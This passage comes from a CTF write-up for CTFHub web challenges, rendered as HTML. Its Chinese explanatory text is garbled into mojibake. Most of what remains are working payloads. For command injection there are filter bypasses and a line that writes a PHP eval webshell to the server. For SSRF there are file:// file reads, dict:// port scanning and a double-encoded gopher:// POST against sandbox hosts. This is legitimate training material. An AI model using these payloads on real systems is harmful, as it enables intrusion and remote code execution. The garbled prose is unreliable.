‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™æ‰§è¡Œæ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥å¯çœŸå¯å‡ã€‚</li><li>â€œ&amp;&amp;â€ï¼šå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œä¹Ÿä¸æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥ä¸ºçœŸåˆ™ä¸¤æ¡å‘½ä»¤éƒ½æ‰§è¡Œï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºçœŸã€‚</li></ol><ul><li><p>è§£æ³•ä¸€ï¼šä½¿ç”¨base64ç¼–ç </p><ul><li><p>æˆ‘ä»¬åœ¨æ¡†å†…è¾“å…¥</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> | ls # è¾“å‡ºä¸¤ä¸ªphpæ–‡ä»¶</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> | ls / #æ ¹ç›®å½•æ²¡å‘ç°å…¶ä»–å¯ç–‘æ–‡ä»¶</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> &amp; cat <span class="number">31007322329204</span>.php # æœªå›æ˜¾</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> &amp; cat <span class="number">31007322329204</span>.php | base64 #ä½¿ç”¨base64ç¼–ç </span><br><span class="line"># è§£ç åè·å¾—&lt;?php // ctfhub&#123;ed09b50ed879851ad5b5a4d9&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>è§£æ³•äºŒï¼šé‡å®šå‘</p><ul><li>æˆ‘ä»¬å¯ä»¥ç”¨é‡å®šå‘çš„æ–¹æ³•æ³¨å…¥ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>&amp;<span class="built_in">echo</span> -e &quot;&lt;?php @eval(\$_POST[&#x27;test&#x27;]);?&gt;&quot; &gt; shell.php</span><br></pre></td></tr></table></figure><ul><li>ä½¿ç”¨èšå‰‘è¿æ¥å³å¯</li></ul></li></ul><h4><span id="è¿‡æ»¤cat">è¿‡æ»¤cat</span></h4><p>3.ä½¿ç”¨å•å¼•å·ç»•è¿‡ </p><p>127.0.0.1; câ€™â€™at flag_2287214057241.php |base64<br>4.ä½¿ç”¨åŒå¼•å·ç»•è¿‡ </p><p>127.0.0.1; câ€â€at flag_2287214057241.php |base64<br>5.åˆ©ç”¨Shell ç‰¹æ®Šå˜é‡ç»•è¿‡</p><p>127.0.0.1; ca$@t flag_2287214057241.php|base64</p><h4><span id="è¿‡æ»¤ç©ºæ ¼">è¿‡æ»¤ç©ºæ ¼</span></h4><p>ç©ºæ ¼å¯ä»¥ç”¨ä»¥ä¸‹å­—ç¬¦ä»£æ›¿ï¼š<br><code>&lt; ã€&lt;&gt;ã€%20(space)ã€%09(tab)ã€$IFS$9ã€ $&#123;IFS&#125;ã€$IFS</code>ç­‰</p><p>$IFSåœ¨linuxä¸‹è¡¨ç¤ºåˆ†éš”ç¬¦ï¼Œä½†æ˜¯å¦‚æœå•çº¯çš„cat$IFS2ï¼Œbashè§£é‡Šå™¨ä¼šæŠŠæ•´ä¸ªIFS2å½“åšå˜é‡åï¼Œæ‰€ä»¥å¯¼è‡´è¾“ä¸å‡ºæ¥ç»“æœï¼Œå› æ­¤è¿™é‡ŒåŠ ä¸€ä¸ª{}å°±å›ºå®šäº†å˜é‡åã€‚<br>åŒç†ï¼Œåœ¨åé¢åŠ ä¸ª$å¯ä»¥èµ·åˆ°æˆªæ–­çš„ä½œç”¨ï¼Œä½¿ç”¨$9æ˜¯å› ä¸ºå®ƒæ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹çš„ç¬¬ä¹ä¸ªå‚æ•°çš„æŒæœ‰è€…ï¼Œå®ƒå§‹ç»ˆä¸ºç©ºå­—ç¬¦ä¸²ã€‚</p><h4><span id="è¿‡æ»¤ç›®å½•åˆ†å‰²ç¬¦">è¿‡æ»¤ç›®å½•åˆ†å‰²ç¬¦</span></h4><p>æ€è·¯ä¸Šæ¥è¯´åº”è¯¥æ˜¯catæ–‡ä»¶ï¼Œå¿…é¡»è¦ä½¿ç”¨ç›®å½•åˆ†éš”ç¬¦&#x2F;ï¼Œä½†æ˜¯é¢˜ç›®ç»™è¿‡æ»¤ã€‚éœ€è¦å¦å¤–å¯»æ‰¾åŠæ³•  </p><ul><li>æ³•ä¸€ï¼šä½¿ç”¨cdç»•å¼€</li></ul><p>linuxä¸­ï¼š<code>%0a ã€%0d ã€; ã€&amp; ã€| ã€&amp;&amp;ã€||</code></p><p>windowsä¸­ï¼š<code>%0aã€&amp;ã€|</code></p><p>å…¶ä¸­åˆ†å·;çš„ä½œç”¨å°±æ˜¯åœ¨ shell ä¸­ï¼Œæ‹…ä»»â€è¿ç»­æŒ‡ä»¤â€åŠŸèƒ½</p><p>&amp;&amp;çš„æ–¹å¼ï¼šcommand1 &amp;&amp; command2 å¦‚æœcommand1æ‰§è¡ŒæˆåŠŸï¼Œåˆ™æ‰§è¡Œcommand2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cd flag_is_here;cat flag_164641924722716.php|base64</span><br></pre></td></tr></table></figure><h4><span id="è¿‡æ»¤è¿ç®—ç¬¦">è¿‡æ»¤è¿ç®—ç¬¦</span></h4><ul><li>å‘ç°é¢˜ç›®æ²¡æœ‰è¿‡æ»¤<code>;</code>å› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨</li><li>åœ¨f12ä¸­çš„preæ ‡ç­¾é‡Œé¢æœ‰æ³¨é‡Š</li></ul><h4><span id="ç»¼åˆç»ƒä¹ ">ç»¼åˆç»ƒä¹ </span></h4><p><a href="https://blog.csdn.net/weixin_45897324/article/details/109271622">urlæŸ¥çœ‹è¡¨</a></p><ul><li><p>é¢˜è§£ä¸€</p><p>%0a ä»£æ›¿ æ¢è¡Œ ï¼Œ<code>%09</code>ä»£æ›¿ TABé”® ï¼ˆå› ä¸ºflagè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡TABæ¥è¡¥å…¨flag_is_here ï¼‰<code>%5c</code> ä»£æ›¿ \ï¼ˆç”¨ \ æ¥åˆ†éš”å¼€ cat ï¼Œå› ä¸º cat ä¹Ÿè¢«è¿‡æ»¤äº†qwqï¼‰</p><p>è¿™é¢˜å¾—åœ¨åœ°å€æ è¾“å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1%0als</span><br><span class="line">?ip=127.0.0.1%0als%09*is_here</span><br><span class="line">? # æŸ¥çœ‹flag_is_hereæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶ip=127.0.0.1%0acd%09*_is_here%0aca%5ct%09*_98358017212.php</span><br><span class="line"># æ³¨ï¼š%0aä»£æ›¿æ¢è¡Œï¼Œ%09ä»£æ›¿TABé”®ï¼ˆå› ä¸ºflagè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡TABæ¥è¡¥å…¨flag_is_hereï¼‰</span><br><span class="line">ã€€ã€€%5cä»£æ›¿\ï¼ˆç”¨\æ¥åˆ†éš”å¼€catï¼Œå› ä¸ºcatä¹Ÿè¢«è¿‡æ»¤äº†qwqï¼‰</span><br></pre></td></tr></table></figure><p>åœ¨f12ä¸­èƒ½çœ‹åˆ°ç­”æ¡ˆ</p><figure class="highlight plaintext"><figcaption><span>sourceå¯ä»¥ç”¨ls sour\*ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ls \*rce</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- é¢˜è§£äºŒ</span><br><span class="line"></span><br><span class="line">  ```cmd</span><br><span class="line">  127.0.0.1%0als$&#123;IFS&#125;fl$*ag_is_here </span><br><span class="line">  127.0.0.1%0acd$&#123;IFS&#125;fl$ag_is_here%0aca&#x27;&#x27;t$&#123;IFS&#125;fl$a*g_230191972813921.php # å› ä¸ºè¿‡æ»¤äº†catï¼Œæˆ‘ä»¬è¿™é‡Œä½¿ç”¨å•å¼•å·ç»•è¿‡è¿‡æ»¤ï¼Œå¦‚ca&#x27;&#x27;t æ„é€ payload</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<code>&#39;&#39;</code>å¯ä»¥ç”¨<code>%27</code>ä»£æ›¿ï¼Œå°†catçš„ä»»æ„å­—æ¯åŒ…è£¹ã€‚</p></li></ul><h3><span id="ssrf">SSRF</span></h3><blockquote><p>SSRT(Server-Side Request Forgeryï¼ŒæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )ï¼Œå°±æ˜¯æ”»å‡»è€…åˆ©ç”¨æœåŠ¡å™¨èƒ½è®¿é—®å…¶ä»–çš„æœåŠ¡å™¨çš„åŠŸèƒ½ï¼Œé€šè¿‡è‡ªå·±çš„æ„é€ æœåŠ¡å™¨è¯·æ±‚æ¥æ”»å‡»ä¸å¤–ç•Œä¸ç›¸è¿æ¥çš„å†…ç½‘ï¼Œæˆ‘ä»¬çŸ¥é“å†…ç½‘ä¸å¤–ç½‘æ˜¯ä¸ç›¸é€šçš„ï¼Œæ‰€ä»¥åˆ©ç”¨è¿™ä¸€ä¸ªç‰¹æ€§ï¼Œå°±å¯ä»¥åˆ©ç”¨å­˜åœ¨ç¼ºé™·çš„WEBåº”ç”¨ä½œä¸ºä»£ç† æ”»å‡»è¿œç¨‹ å’Œ æœ¬åœ°çš„æœåŠ¡å™¨ã€‚</p></blockquote><p><img src="/2023/03/29/ctf/a622392d2eac336271e32e052def5adc.png" alt="ssrf"></p><p><a href="https://blog.csdn.net/qq_51295677/article/details/124697338">reference</a></p><p><a href="https://blog.csdn.net/qq_57172130/article/details/126169480">SSRFåˆ©ç”¨åè®®ä¸­çš„ä¸‡é‡‘æ²¹â€”â€”Gopher</a></p><ul><li>gopheråè®®æ•°æ®æµä¸­ï¼Œurlç¼–ç ä½¿ç”¨%0d%0aæ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„å›è½¦æ¢è¡Œ</li><li>æ•°æ®æµæœ«å°¾ä½¿ç”¨%0d%0aä»£è¡¨æ¶ˆæ¯ç»“æŸ</li></ul><p><strong>å…³äºurlç¼–ç é—®é¢˜</strong></p><p>ç¬¬ä¸€ï¼Œåˆ©ç”¨ssrfç»å¸¸è¦è¿›è¡Œå¤šæ¬¡urlç¼–ç ï¼ˆä¼ å‚æˆ–è€…å¤šæ¬¡è·³è½¬éœ€è¦å¤šæ¬¡urlç¼–ç ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæœ‰å¤šå°‘æ¬¡è¯·æ±‚å°±è¦ç¼–ç å¤šå°‘æ¬¡ï¼Œç›´æ¥curlåæ¥gopher:&#x2F;&#x2F;å°±ç¼–ç ä¸€æ¬¡ï¼Œåˆ©ç”¨?url&#x3D;gopher:&#x2F;&#x2F;è¿™æ ·çš„å½¢å¼è¿›è¡Œssrfåˆ©ç”¨å°±ç›¸å½“äºè¯·æ±‚äº†ä¸¤æ¬¡ï¼Œéœ€è¦ç¼–ç ä¸¤æ¬¡ï¼Œå¦‚æœæœ‰302è·³è½¬ï¼Œåˆ™è¿˜éœ€è¦å†ç¼–ç ï¼‰ï¼Œç¬¬ä¸€æ¬¡urlç¼–ç åï¼Œå°†æ‰€æœ‰%0aæ”¹æˆ%0Â¢%0a<br>gopher:&#x2F;é»˜è®¤å‘é€åˆ°70ç«¯å£ï¼Œä¸€èˆ¬æˆ‘ä»¬éœ€è¦å‘é€åˆ°80ç«¯å£ï¼Œè®°å¾—æ”¹</p><h4><span id="å†…ç½‘è®¿é—®">å†…ç½‘è®¿é—®</span></h4><ul><li><p>è€ƒå¯Ÿ<code>http://</code>åè®®</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../?url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure></li></ul><h4><span id="ä¼ªåè®®è¯»å–æ–‡ä»¶">ä¼ªåè®®è¯»å–æ–‡ä»¶</span></h4><ul><li><p>è¿™ä¸€é¢˜çš„è€ƒç‚¹ä¸»è¦æ˜¯<strong>fileåè®®</strong>è¯»å–æ–‡ä»¶</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure></li></ul><h4><span id="ç«¯å£æ‰«æ">ç«¯å£æ‰«æ</span></h4><ul><li>è€ƒå¯Ÿ<code>dict://</code>åè®®</li></ul><p>ä½¿ç”¨burp suiteè¿›è¡Œç«¯å£æ‰«æ</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=dict://127.0.0.1:Â§Â§</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-235c64bde60462f1.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>  ç„¶åæ³¨å…¥ä½¿ç”¨æ•°å­—ä»8000-9000ï¼Œæ­¥è¿›ä¸º1ï¼Œå‘ç°ç«¯å£<code>8243</code>çš„æ•°æ®é•¿åº¦ä¸ä¸€è‡´ã€‚ä½¿ç”¨<code>http://</code>è®¿é—®ï¼Œ<em>httpå¯ä»¥å¿½ç•¥</em></p>  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">http://<span class="title">challenge</span>-235<span class="title">c64bde60462f1.sandbox.ctfhub.com</span>:10800/?<span class="title">url</span>=127.0.0.1:8243</span></span><br></pre></td></tr></table></figure><h4><span id="postè¯·æ±‚">POSTè¯·æ±‚</span></h4><ul><li><p>ä½¿ç”¨dirsearchå¯¹æœåŠ¡å™¨åº•ä¸‹çš„ç›®å½•è¿›è¡Œæ‰«æ</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://challenge-c81b1dbf4106f429.sandbox.ctfhub.com:<span class="number">10800</span>/?url=<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span></span><br></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨<code>file</code>åè®®å¯¹index.phpé¡µé¢<a href="https://so.csdn.net/so/search?q=%E6%BA%90%E7%A0%81&spm=1001.2101.3001.7020">æºç </a>è¿›è¡Œè¯»å–</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=file:///var/www/html/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-f2d0d9c7e78f56ec.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿”å›</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /?url=_&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure></li></ul><p>å‘é€</p>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=file:///var/www/html/flag.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-f2d0d9c7e78f56ec.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>è¿”å›</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Just View From 127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;CTFHUB&quot;</span>);</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;key&quot;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&quot;key&quot;</span>] == <span class="variable">$key</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;/flag.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;key&quot;</span>&gt;</span><br><span class="line">&lt;!-- Debug: key=<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$key</span>;<span class="meta">?&gt;</span>--&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><ul><li>é¢˜ç›®æ„æ€æ˜¯è¦æ„é€ ä¸€ä¸ªPOSTè¯·æ±‚ï¼Œä¼ å‚key</li></ul><p>è®¿é—®<code>http://127.0.0.1/flag.php</code> å‘ç°</p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/flag.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;key&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- De<span class="doctag">bug:</span> key=21327983b7a37abf3ace93cc0e64f15f--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨å‘æœåŠ¡å™¨å‘é€è¯·æ±‚æ—¶ï¼Œé¦–å…ˆæµè§ˆå™¨ä¼šè¿›è¡Œä¸€æ¬¡ URLè§£ç ï¼Œå…¶æ¬¡æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åï¼Œåœ¨æ‰§è¡ŒcurlåŠŸèƒ½æ—¶ï¼Œè¿›è¡Œç¬¬äºŒæ¬¡ URLè§£ç ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸¤æ¬¡ç¼–ç </p><ul><li><p><strong>æ„é€ gopheråè®®</strong></p><ul><li>åœ¨gopheråè®®ä¸­å‘é€HTTPçš„æ•°æ®ï¼Œéœ€è¦ä»¥ä¸‹ä¸‰æ­¥ï¼š</li></ul><p>1ã€æ„é€ HTTPæ•°æ®åŒ…</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.æ„é€ HTTPæ•°æ®åŒ…</span></span><br><span class="line">raw = <span class="string">&quot;&quot;&quot;POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1:80</span></span><br><span class="line"><span class="string">Content-Length: 36</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">key=21327983b7a37abf3ace93cc0e64f15f&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>2ã€URLç¼–ç ã€æ›¿æ¢å›è½¦æ¢è¡Œä¸º%0d%0a</p>   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># URLç¼–ç ã€æ›¿æ¢å›è½¦æ¢è¡Œä¸º%0d%0a</span></span><br><span class="line">data = raw.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">res = urllib.parse.quote(urllib.parse.quote(data))</span><br></pre></td></tr></table></figure><p>3ã€å‘é€gopheråè®®ï¼Œæœ‰çš„æ•™ç¨‹è¯´åé¢è¦åŠ ç»“æŸç¬¦<code>%0d%0a</code>ï¼Œä½†æ˜¯è¿™é“é¢˜è²Œä¼¼ä¸ç”¨</p>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%252036%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250A%250D%250Akey%253D21327983b7a37abf3ace93cc0e64f15f</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-f2d0d9c7e78f56ec.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>ç»“æœ</p>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty/1.19.3.2</span><br><span class="line"><span 